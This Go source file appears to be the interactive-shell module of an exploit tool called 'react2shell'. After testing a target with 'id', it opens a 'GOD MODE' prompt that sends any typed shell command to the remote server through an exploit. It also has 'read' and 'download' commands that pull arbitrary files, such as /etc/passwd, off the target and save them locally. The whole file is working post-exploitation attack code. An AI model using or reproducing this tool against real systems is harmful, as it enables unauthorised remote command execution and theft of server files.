package shell

import (
	"bufio"
	"context"
	"fmt"
	"net/url"
	"os"
	"strings"

	"github.com/react2shell/scanner/internal/scanner"
	"github.com/react2shell/scanner/pkg/models"
)

type Shell struct {
	scanner scanner.Scanner
	url     string
	opts    *models.ScanOptions
	history []string
}

func NewShell(s scanner.Scanner, targetURL string, opts *models.ScanOptions) *Shell {
	return &Shell{
		scanner: s,
		url:     targetURL,
		opts:    opts,
		history: make([]string, 0),
	}
}

func (sh *Shell) Run(ctx context.Context) error {
	sh.printBanner()

	fmt.Println("[*] Testing target exploitability...")
	success, output, err := sh.scanner.ExecuteCommand(ctx, sh.url, "id", sh.opts)
	if err != nil {
		return err
	}

	if success {
		fmt.Printf("[✓] Target is exploitable! User: %s\n\n", output)
	} else {
		fmt.Printf("[!] Target may not be exploitable: %s\n", output)
		fmt.Println("[*] Continuing anyway - some commands may still work...\n")
	}

	reader := bufio.NewReader(os.Stdin)

	for {
		hostname := sh.getHostname()
		fmt.Printf("react2shell:%s$ ", hostname)

		line, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("\n[*] Exiting interactive shell...")
			return nil
		}

		cmd := strings.TrimSpace(line)
		if cmd == "" {
			continue
		}

		if err := sh.handleCommand(ctx, cmd); err != nil {
			if err == errExit {
				return nil
			}
			fmt.Printf("Error: %v\n", err)
		}
	}
}

var errExit = fmt.Errorf("exit")

func (sh *Shell) handleCommand(ctx context.Context, cmd string) error {
	cmdLower := strings.ToLower(cmd)

	switch {
	case cmdLower == "exit" || cmdLower == "quit" || cmdLower == "q":
		fmt.Println("\n[*] Exiting interactive shell...")
		return errExit

	case cmdLower == "help":
		sh.printHelp()
		return nil

	case cmdLower == "history":
		sh.printHistory()
		return nil

	case cmdLower == "clear":
		fmt.Print("\033[H\033[2J")
		return nil

	case strings.HasPrefix(cmdLower, "read "):
		filepath := strings.TrimSpace(cmd[5:])
		if filepath == "" {
			fmt.Println("[!] Usage: read <filepath>")
			return nil
		}
		return sh.handleReadFile(ctx, filepath)

	case strings.HasPrefix(cmdLower, "download "):
		parts := strings.Fields(cmd[9:])
		if len(parts) != 2 {
			fmt.Println("[!] Usage: download <remote_path> <local_path>")
			return nil
		}
		return sh.handleDownload(ctx, parts[0], parts[1])

	default:
		return sh.handleExecute(ctx, cmd)
	}
}

func (sh *Shell) handleExecute(ctx context.Context, cmd string) error {
	fmt.Printf("[*] Executing: %s\n", cmd)
	success, output, err := sh.scanner.ExecuteCommand(ctx, sh.url, cmd, sh.opts)
	if err != nil {
		return err
	}

	if success {
		fmt.Printf("\n%s\n\n", output)
	} else {
		fmt.Printf("[✗] Command failed: %s\n", output)
	}

	sh.history = append(sh.history, cmd)
	return nil
}

func (sh *Shell) handleReadFile(ctx context.Context, filepath string) error {
	fmt.Printf("[*] Reading file: %s\n", filepath)
	success, content, err := sh.scanner.ReadFile(ctx, sh.url, filepath, sh.opts)
	if err != nil {
		return err
	}

	if success {
		fmt.Println("============================================================")
		fmt.Printf("File: %s\n", filepath)
		fmt.Println("============================================================")
		fmt.Println(content)
		fmt.Println("============================================================\n")
	} else {
		fmt.Printf("[✗] Failed to read file: %s\n", content)
	}

	sh.history = append(sh.history, "read "+filepath)
	return nil
}

func (sh *Shell) handleDownload(ctx context.Context, remotePath, localPath string) error {
	fmt.Printf("[*] Downloading: %s -> %s\n", remotePath, localPath)
	success, content, err := sh.scanner.ReadFile(ctx, sh.url, remotePath, sh.opts)
	if err != nil {
		return err
	}

	if success {
		if err := os.WriteFile(localPath, []byte(content), 0644); err != nil {
			fmt.Printf("[✗] Failed to save file: %v\n", err)
			return nil
		}
		fmt.Printf("[✓] Downloaded %d bytes to %s\n", len(content), localPath)
	} else {
		fmt.Printf("[✗] Failed to download: %s\n", content)
	}

	sh.history = append(sh.history, fmt.Sprintf("download %s %s", remotePath, localPath))
	return nil
}

func (sh *Shell) printBanner() {
	fmt.Println(`
╔════════════════════════════════════════════════════════════════════════╗
║                    INTERACTIVE SHELL - GOD MODE                        ║
╠════════════════════════════════════════════════════════════════════════╣`)
	fmt.Printf("║  Target: %-60s  ║\n", truncate(sh.url, 60))
	fmt.Println(`╠════════════════════════════════════════════════════════════════════════╣
║  Commands:                                                             ║
║    • Type any shell command to execute (ls, whoami, id, cat, etc.)     ║
║    • 'read <file>' - Read file contents (e.g., read /etc/passwd)       ║
║    • 'download <remote> <local>' - Download file to local              ║
║    • 'help' - Show this help                                           ║
║    • 'exit' or 'quit' - Exit interactive shell                         ║
╚════════════════════════════════════════════════════════════════════════╝
`)
}

func (sh *Shell) printHelp() {
	fmt.Println(`
Available Commands:
  Any shell command     Execute command on target (ls, whoami, cat, etc.)
  read <filepath>       Read file contents from target
  download <r> <l>      Download remote file to local path
  history               Show command history
  clear                 Clear screen
  exit/quit             Exit interactive shell
`)
}

func (sh *Shell) printHistory() {
	if len(sh.history) == 0 {
		fmt.Println("No command history")
		return
	}
	fmt.Println("\nCommand History:")
	for i, cmd := range sh.history {
		fmt.Printf("  %d. %s\n", i+1, cmd)
	}
	fmt.Println()
}

func (sh *Shell) getHostname() string {
	parsed, err := url.Parse(sh.url)
	if err != nil {
		return "unknown"
	}
	return parsed.Host
}

func truncate(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}

